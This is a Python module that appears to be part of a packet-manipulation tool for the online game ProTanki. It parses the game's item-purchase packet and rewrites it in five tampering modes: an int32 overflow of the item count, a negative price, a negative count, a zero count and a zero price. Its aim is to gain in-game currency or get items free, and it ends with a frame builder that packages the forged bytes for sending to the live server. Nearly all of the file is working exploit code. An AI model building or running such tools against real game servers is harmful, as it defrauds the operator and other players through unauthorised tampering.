"""
TryBuyItem injection — multiple modes.

Packet layout (pid -1961983005):
  StringCodec(item_id)  =  0x00 + int32_BE(len) + utf8_bytes
  int32_BE  count
  int32_BE  unit_price

Modes
-----
overflow-count  (original hypothesis)
    Replaces count with a value that overflows int32(count * price) to -gain.
    Works only if server uses int32 arithmetic. Failed: server uses int64.

neg-price
    Sends count=1, price=-gain.
    Works if server trusts the client-provided price field.

neg-count
    Sends count=-1, original price.
    Works if server computes int32(-1 * price) = negative -> balance increase.
    Fails if server validates count >= 1.

zero-count
    Sends count=0, original price.
    Works if server computes total=0 -> item for free (no crystal change).
    Fails if server validates count >= 1.

free
    Sends count=1, price=0.
    Works if server trusts client price and doesn't validate against known price.
"""
from __future__ import annotations

import struct
from typing import Optional, Tuple

TRY_BUY_ITEM_PID = -1961983005

MODES = ('overflow-count', 'neg-price', 'neg-count', 'zero-count', 'free')


# ─── Math helpers ─────────────────────────────────────────────────────────────

def signed_int32(n: int) -> int:
    n &= 0xFFFFFFFF
    return n - (1 << 32) if n >= (1 << 31) else n


def compute_overflow_count(desired_gain: int, unit_price: int) -> Optional[int]:
    """
    Find smallest positive int32 count such that int32(count * unit_price) == -desired_gain.
    Iterates N in: count = (N * 2^32 - desired_gain) / unit_price.
    """
    if unit_price <= 0 or desired_gain <= 0:
        return None
    modulus = 1 << 32
    for N in range(1, 200_000):
        numerator = N * modulus - desired_gain
        if numerator > 0 and numerator % unit_price == 0:
            count = numerator // unit_price
            if 0 < count < (1 << 31):
                return count
    return None


# ─── Codec helpers ────────────────────────────────────────────────────────────

def decode_try_buy_item(plain: bytes) -> Optional[Tuple[str, int, int]]:
    """Parse TryBuyItem payload. Returns (item_id, count, unit_price) or None."""
    off = 0
    if off >= len(plain) or plain[off] != 0:
        return None
    off += 1
    if off + 4 > len(plain):
        return None
    slen = struct.unpack_from('>i', plain, off)[0]; off += 4
    if slen < 0 or off + slen > len(plain):
        return None
    item_id = plain[off:off + slen].decode('utf-8', 'replace'); off += slen
    if off + 8 > len(plain):
        return None
    count      = struct.unpack_from('>i', plain, off)[0]; off += 4
    unit_price = struct.unpack_from('>i', plain, off)[0]
    return item_id, count, unit_price


def encode_try_buy_item(item_id: str, count: int, unit_price: int) -> bytes:
    """Serialize TryBuyItem payload."""
    raw_id = item_id.encode('utf-8')
    return (b'\x00'
            + struct.pack('>i', len(raw_id))
            + raw_id
            + struct.pack('>i', count)
            + struct.pack('>i', unit_price))


# ─── Patch functions (one per mode) ──────────────────────────────────────────

def _patch_overflow_count(item_id: str, count_orig: int, unit_price: int,
                          desired_gain: int) -> Optional[Tuple[bytes, dict]]:
    """int32 overflow via large count. Requires server uses int32 multiplication."""
    count_new = compute_overflow_count(desired_gain, unit_price)
    if count_new is None:
        return None
    return encode_try_buy_item(item_id, count_new, unit_price), {
        'mode': 'overflow-count',
        'item': item_id,
        'count_orig': count_orig,
        'count_new': count_new,
        'price': unit_price,
        'overflow_int32': signed_int32(count_new * unit_price),
        'expected_gain': desired_gain,
    }


def _patch_neg_price(item_id: str, count_orig: int, unit_price: int,
                     desired_gain: int) -> Tuple[bytes, dict]:
    """Send count=1, price=-desired_gain. Server credits if it trusts client price."""
    return encode_try_buy_item(item_id, 1, -desired_gain), {
        'mode': 'neg-price',
        'item': item_id,
        'count_orig': count_orig,
        'price_orig': unit_price,
        'price_sent': -desired_gain,
        'expected_gain': desired_gain,
    }


def _patch_neg_count(item_id: str, count_orig: int,
                     unit_price: int) -> Tuple[bytes, dict]:
    """Send count=-1. int32(-1 * price) = -price -> balance increase by price."""
    return encode_try_buy_item(item_id, -1, unit_price), {
        'mode': 'neg-count',
        'item': item_id,
        'count_orig': count_orig,
        'price': unit_price,
        'expected_gain': unit_price,
    }


def _patch_zero_count(item_id: str, count_orig: int,
                      unit_price: int) -> Tuple[bytes, dict]:
    """Send count=0. total=0 -> item for free if server skips validation."""
    return encode_try_buy_item(item_id, 0, unit_price), {
        'mode': 'zero-count',
        'item': item_id,
        'count_orig': count_orig,
        'price': unit_price,
        'expected_gain': 0,
        'note': 'free item if server accepts count=0',
    }


def _patch_free(item_id: str, count_orig: int,
                unit_price: int) -> Tuple[bytes, dict]:
    """Send count=1, price=0. Free item if server trusts client price."""
    return encode_try_buy_item(item_id, 1, 0), {
        'mode': 'free',
        'item': item_id,
        'count_orig': count_orig,
        'price_orig': unit_price,
        'price_sent': 0,
        'expected_gain': unit_price,
        'note': 'free if server trusts client price',
    }


# ─── Dispatcher ───────────────────────────────────────────────────────────────

def patch_try_buy_item(plain: bytes, mode: str,
                       desired_gain: int = 1000) -> Optional[Tuple[bytes, dict]]:
    """
    Attempt to patch a TryBuyItem payload according to mode.

    Returns (patched_bytes, info_dict) or None if payload is not TryBuyItem.
    """
    parsed = decode_try_buy_item(plain)
    if parsed is None:
        return None

    item_id, count_orig, unit_price = parsed

    if mode == 'overflow-count':
        return _patch_overflow_count(item_id, count_orig, unit_price, desired_gain)
    elif mode == 'neg-price':
        return _patch_neg_price(item_id, count_orig, unit_price, desired_gain)
    elif mode == 'neg-count':
        return _patch_neg_count(item_id, count_orig, unit_price)
    elif mode == 'zero-count':
        return _patch_zero_count(item_id, count_orig, unit_price)
    elif mode == 'free':
        return _patch_free(item_id, count_orig, unit_price)
    else:
        return None


# ─── Frame builder ────────────────────────────────────────────────────────────

def build_cs_frame(pid: int, encrypted_payload: bytes, compressed: bool = False) -> bytes:
    """Build a complete ProTanki TCP frame ready to send to the server."""
    total_len = 8 + len(encrypted_payload)
    hw = total_len & 0xFFFFFF
    if compressed:
        hw |= 0x40000000
    return struct.pack('>I', hw) + struct.pack('>i', pid) + encrypted_payload
